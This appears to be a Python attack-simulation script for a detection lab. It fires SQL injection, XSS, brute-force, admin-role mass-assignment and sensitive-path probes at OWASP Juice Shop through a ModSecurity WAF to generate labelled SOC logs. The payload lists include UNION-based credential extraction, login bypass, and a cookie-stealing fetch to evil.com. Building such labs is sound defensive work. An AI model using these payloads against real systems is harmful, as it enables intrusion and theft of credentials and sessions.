"""
12-Scenario Attack Simulation with Multi-IP Support
Generates realistic SOC logs with 6 attack types × 2 styles (aggressive/stealthy)

Run: python attack_scenario.py
"""

import subprocess
import time
import random
import re
import threading
import os
import json
from datetime import datetime
from pathlib import Path

# ===================================================================
# CONFIGURATION
# ===================================================================

WAF = "http://modsecurity:8080"
LOG_FILE = "scenario_run.log"
GROUND_TRUTH_DIR = "./ground_truth"

CONTAINER_IPS = {
    "attacker-1": "172.19.0.10",
    "attacker-2": "172.19.0.11",
    "attacker-3": "172.19.0.12",
    "attacker-4": "172.19.0.13",
    "attacker-5": "172.19.0.14",
    "attacker-6": "172.19.0.15",
    "benign-1":   "172.19.0.50",
    "benign-2":   "172.19.0.51",
    "benign-3":   "172.19.0.52",
}

WINDOW_SECONDS = 300  # 5 minutes

# 12 Scenarios: 6 attack types × 2 waves (aggressive + stealthy)
SCENARIOS = [
    # Wave 1: Aggressive attacks (t=0 to t=15min)
    {"id": 1,  "attack": "sqli",           "container": "attacker-1", "window": 0, "style": "aggressive"},
    {"id": 2,  "attack": "xss",            "container": "attacker-2", "window": 0, "style": "aggressive"},
    {"id": 3,  "attack": "webscan",        "container": "attacker-3", "window": 1, "style": "aggressive"},
    {"id": 4,  "attack": "bruteforce",     "container": "attacker-4", "window": 1, "style": "aggressive"},
    {"id": 5,  "attack": "broken_auth",    "container": "attacker-5", "window": 2, "style": "aggressive"},
    {"id": 6,  "attack": "sensitive_data", "container": "attacker-6", "window": 2, "style": "aggressive"},

    # Wave 2: Stealthy attacks (t=15min to t=30min)
    {"id": 7,  "attack": "sqli",           "container": "attacker-1", "window": 3, "style": "stealthy"},
    {"id": 8,  "attack": "xss",            "container": "attacker-2", "window": 3, "style": "stealthy"},
    {"id": 9,  "attack": "webscan",        "container": "attacker-3", "window": 4, "style": "stealthy"},
    {"id": 10, "attack": "bruteforce",     "container": "attacker-4", "window": 4, "style": "stealthy"},
    {"id": 11, "attack": "broken_auth",    "container": "attacker-5", "window": 5, "style": "stealthy"},
    {"id": 12, "attack": "sensitive_data", "container": "attacker-6", "window": 5, "style": "stealthy"},
]

# ===================================================================
# ATTACK PAYLOADS
# ===================================================================

PAYLOADS = {
    "sqli": [
        ("GET",  "/rest/products/search?q=lol'", None),
        ("GET",  "/rest/products/search?q=lol'+OR+1=1--", None),
        ("GET",  "/rest/products/search?q=lol'+UNION+SELECT+1,2,3,email,password,6,7,8,9+FROM+Users--", None),
        ("GET",  "/rest/products/search?q=lol'+AND+1=CONVERT(int,(SELECT+TOP+1+email+FROM+Users))--", None),
        ("GET",  "/rest/products/search?q=lol'+(SELECT+SLEEP(5))--", None),
        ("POST", "/rest/user/login", '{"email":"\' OR 1=1--","password":"x"}'),
        ("POST", "/rest/user/login", '{"email":"admin\'--","password":"anything"}'),
    ],

    "xss": [
        ("GET",  "/rest/products/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", None),
        ("GET",  "/rest/products/search?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E", None),
        ("GET",  "/rest/products/search?q=%3Csvg/onload%3Dalert(document.domain)%3E", None),
        ("GET",  "/redirect?to=javascript:alert(document.cookie)", None),
        ("POST", "/api/Feedbacks", '{"comment":"Great!<script>alert(document.cookie)</script>","rating":5}'),
        ("POST", "/api/Feedbacks", '{"comment":"<img src=x onerror=fetch(\\"http://evil.com/\\"+document.cookie)>","rating":4}'),
        ("POST", "/api/Users", '{"email":"xss@test.com","password":"Test1234!","username":"<svg onload=alert(1)>"}'),
    ],

    "webscan": [
        ("GET", "/", None),
        ("GET", "/robots.txt", None),
        ("GET", "/.env", None),
        ("GET", "/.git/config", None),
        ("GET", "/.git/HEAD", None),
        ("GET", "/admin", None),
        ("GET", "/swagger-ui.html", None),
        ("GET", "/api-docs", None),
        ("GET", "/phpmyadmin", None),
        ("GET", "/wp-admin", None),
        ("GET", "/console", None),
        ("GET", "/server-status", None),
    ],

    "bruteforce": [
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"admin"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"password"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"123456"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"admin123"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"letmein"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"qwerty"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"changeme"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"root"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"juice"}'),
        ("POST", "/rest/user/login", '{"email":"admin@juice-sh.op","password":"test"}'),
    ],

    "broken_auth": [
        ("GET", "/rest/admin/application-configuration", None),
        ("GET", "/rest/admin/application-version", None),
        ("GET", "/rest/admin/application-configuration", None),
        ("POST", "/api/Users", '{"email":"hacker@evil.com","password":"Hack1234!","role":"admin"}'),
        ("GET", "/rest/user/whoami", None),
        ("PUT", "/api/Users/1", '{"role":"admin"}'),
    ],

    "sensitive_data": [
        ("GET", "/ftp/", None),
        ("GET", "/ftp/coupons_2013.md.bak", None),
        ("GET", "/ftp/eastere.gg", None),
        ("GET", "/ftp/legal.md", None),
        ("GET", "/rest/user/data-delight", None),
        ("GET", "/rest/user/accounting", None),
        ("GET", "/rest/user/whoami", None),
    ],
}

# ===================================================================
# ATTACK METADATA (for ground truth generation)
# ===================================================================

ATTACK_METADATA = {
    "sqli": {
        "attack_type": "SQL Injection",
        "mitre_id": "T1190",
        "owasp": "A03:2021 - Injection",
    },
    "xss": {
        "attack_type": "Cross-Site Scripting",
        "mitre_id": "T1059.007",
        "owasp": "A03:2021 - Injection",
    },
    "webscan": {
        "attack_type": "Web Vulnerability Scanning",
        "mitre_id": "T1595.001",
        "owasp": "A05:2021 - Security Misconfiguration",
    },
    "bruteforce": {
        "attack_type": "Brute Force",
        "mitre_id": "T1110.001",
        "owasp": "A07:2021 - Identification and Authentication Failures",
    },
    "broken_auth": {
        "attack_type": "Broken Authentication Access",
        "mitre_id": "T1550.001",
        "owasp": "A07:2021 - Identification and Authentication Failures",
    },
    "sensitive_data": {
        "attack_type": "Sensitive Data Exposure",
        "mitre_id": "T1530",
        "owasp": "A02:2021 - Cryptographic Failures",
    },
}

# ===================================================================
# HELPER FUNCTIONS
# ===================================================================

def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {msg}\n")

def curl(url, method="GET", data=None, container="attacker-1"):
    """Execute curl from within a Docker container"""
    cmd = ["docker", "exec", container, "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}"]
    if method == "POST":
        cmd.extend(["-X", "POST"])
    if data:
        cmd.extend(["-H", "Content-Type: application/json", "-d", data])
    cmd.append(url)
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return result.stdout.strip()
    except Exception as e:
        log(f"  ! curl failed: {e}")
        return "000"

def delay(min_s=0.5, max_s=2.0):
    time.sleep(random.uniform(min_s, max_s))

def phase_header(name, number):
    log("=" * 60)
    log(f" SCENARIO {number}: {name}")
    log("=" * 60)

# ===================================================================
# BENIGN TRAFFIC (Background Thread)
# ===================================================================

def benign_loop(stop_event):
    """Continuous benign browsing from 3 benign IPs"""
    containers = ["benign-1", "benign-2", "benign-3"]
    
    while not stop_event.is_set():
        container = random.choice(containers)
        uri = random.choice([
            "/",
            "/rest/products",
            "/rest/products/search?q=apple",
            "/rest/products/search?q=banana",
            "/rest/products/search?q=orange",
            "/rest/products/1/reviews",
            "/rest/products/2/reviews",
            "/#/about",
            "/#/contact",
        ])
        curl(f"{WAF}{uri}", container=container)
        delay(1, 4)

# ===================================================================
# ATTACK EXECUTION
# ===================================================================

def run_attack(scenario):
    attack = scenario["attack"]
    container = scenario["container"]
    style = scenario["style"]
    payloads = PAYLOADS[attack]
    metadata = ATTACK_METADATA[attack]
    
    log(f"  Attack Type: {metadata['attack_type']}")
    log(f"  MITRE: {metadata['mitre_id']} | OWASP: {metadata['owasp']}")
    log(f"  Source IP: {CONTAINER_IPS[container]} ({container})")
    log(f"  Style: {style}")
    
    for method, uri, data in payloads:
        url = f"{WAF}{uri}"
        status = curl(url, method=method, data=data, container=container)
        log(f"    {method} {uri[:60]} → {status}")
        
        if style == "aggressive":
            delay(0.3, 1.0)
        else:
            delay(8, 20)  # stealthy: looks like normal browsing cadence

# ===================================================================
# GROUND TRUTH GENERATION
# ===================================================================

def save_ground_truth(scenario):
    """Save scenario metadata for later evaluation"""
    os.makedirs(GROUND_TRUTH_DIR, exist_ok=True)
    
    attack = scenario["attack"]
    metadata = ATTACK_METADATA[attack]
    
    output = {
        "scenario_id": scenario["id"],
        "attack_type": metadata["attack_type"],
        "mitre_id": metadata["mitre_id"],
        "owasp": metadata["owasp"],
        "source_ip": CONTAINER_IPS[scenario["container"]],
        "source_container": scenario["container"],
        "time_window": f"{scenario['window'] * 5}-{(scenario['window'] + 1) * 5} minutes",
        "style": scenario["style"],
        "payloads_executed": len(PAYLOADS[attack]),
    }
    
    path = os.path.join(GROUND_TRUTH_DIR, f"scenario_{scenario['id']:02d}_ground_truth.json")
    with open(path, "w") as f:
        json.dump(output, f, indent=2)
    
    log(f"  ✓ Saved ground truth: {path}")

# ===================================================================
# MAIN ORCHESTRATOR
# ===================================================================

def main():
    log("")
    log("╔══════════════════════════════════════════════════════════════╗")
    log("║     12-SCENARIO ATTACK SIMULATION                          ║")
    log("║     Target: OWASP Juice Shop via ModSecurity WAF           ║")
    log("║     Multi-IP: 6 attackers + 3 benign users                 ║")
    log("╚══════════════════════════════════════════════════════════════╝")
    log(f"  Start: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log("")
    
    start_time = time.time()
    
    # Start benign traffic in background
    stop_event = threading.Event()
    benign_thread = threading.Thread(target=benign_loop, args=(stop_event,), daemon=True)
    benign_thread.start()
    log("✓ Benign traffic started (3 users browsing continuously)")
    
    # Group scenarios by window
    windows = {}
    for s in SCENARIOS:
        windows.setdefault(s["window"], []).append(s)
    
    # Execute each window
    for window_id in sorted(windows.keys()):
        target_time = start_time + (window_id * WINDOW_SECONDS)
        now = time.time()
        
        if target_time > now:
            wait_secs = target_time - now
            log(f"\n⏳ Waiting for window {window_id} (sleep {wait_secs:.0f}s)")
            time.sleep(wait_secs)
        
        log(f"\n{'='*60}")
        log(f"WINDOW {window_id} START (t={window_id*5}-{(window_id+1)*5} min)")
        log(f"{'='*60}")
        
        for scenario in windows[window_id]:
            phase_header(f"{scenario['attack'].upper()} ({scenario['style']})", scenario['id'])
            run_attack(scenario)
            save_ground_truth(scenario)
        
        log(f"\nWINDOW {window_id} END")
    
    # Stop benign traffic
    log("\n⏹ Stopping benign traffic...")
    stop_event.set()
    benign_thread.join(timeout=5)
    
    # Summary
    end_time = time.time()
    duration = end_time - start_time
    log("")
    log("=" * 60)
    log(" SCENARIO COMPLETE")
    log(f" End: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log(f" Duration: {duration/60:.1f} minutes")
    log("=" * 60)
    log("")
    
    # Collect logs
    log("Waiting 10s for Wazuh to flush alerts...")
    time.sleep(10)
    
    log("Collecting logs automatically...")
    collected_dir = collect_logs()
    
    log("")
    log("Next steps:")
    log(f"  python normalize_logs.py")
    log(f"  python pre-filter.py")
    log(f"  python clustering.py")
    log(f"  python llm_gen.py")
    log("")
    log(f"Ground truth saved to: {GROUND_TRUTH_DIR}/")
    log("")

# ===================================================================
# LOG COLLECTION
# ===================================================================

def collect_logs():
    """Automatically collect logs from Docker containers"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_dir = Path(f"./logs/run_{timestamp}")
    log_dir.mkdir(parents=True, exist_ok=True)
    
    # Collect from docker logs
    docker_commands = [
        ("modsecurity", "docker logs modsecurity", log_dir / "modsec_waf.log"),
        ("juice-shop", "docker logs juice-shop", log_dir / "juice_app.log"),
    ]
    
    for name, cmd, output in docker_commands:
        try:
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=10)
            with open(output, "w", encoding="utf-8") as f:
                f.write(result.stdout)
            log(f"  ✓ Collected: {output.name}")
        except Exception as e:
            log(f"  ! Failed to collect {name}: {e}")
    
    # Extract nginx access log and modsecurity audit from docker logs
    try:
        result = subprocess.run(
            ["docker", "logs", "modsecurity"],
            capture_output=True, text=True, timeout=30
        )
        combined = result.stdout + result.stderr
        all_lines = combined.split('\n')
        
        # Extract nginx access log lines
        access_lines = [line for line in all_lines 
                       if re.match(r'^\d+\.\d+\.\d+\.\d+ - - \[', line)]
        with open(log_dir / "nginx_access.log", "w", encoding="utf-8") as f:
            f.write('\n'.join(access_lines))
        log(f"  ✓ Collected: nginx_access.log ({len(access_lines)} lines)")
        
        # Extract ModSecurity alerts
        modsec_lines = [line for line in all_lines 
                       if 'ModSecurity:' in line]
        with open(log_dir / "modsec_audit.log", "w", encoding="utf-8") as f:
            f.write('\n'.join(modsec_lines))
        log(f"  ✓ Collected: modsec_audit.log ({len(modsec_lines)} alerts)")
        
        # Extract nginx raw/error log
        raw_lines = [line for line in all_lines 
                    if '[error]' in line or '[warn]' in line]
        with open(log_dir / "nginx_raw.log", "w", encoding="utf-8") as f:
            f.write('\n'.join(raw_lines))
        log(f"  ✓ Collected: nginx_raw.log ({len(raw_lines)} lines)")
            
    except Exception as e:
        log(f"  ! Failed to collect from docker logs: {e}")
    
    log("")
    log(f"All logs saved to: {log_dir}")
    return log_dir

if __name__ == "__main__":
    main()
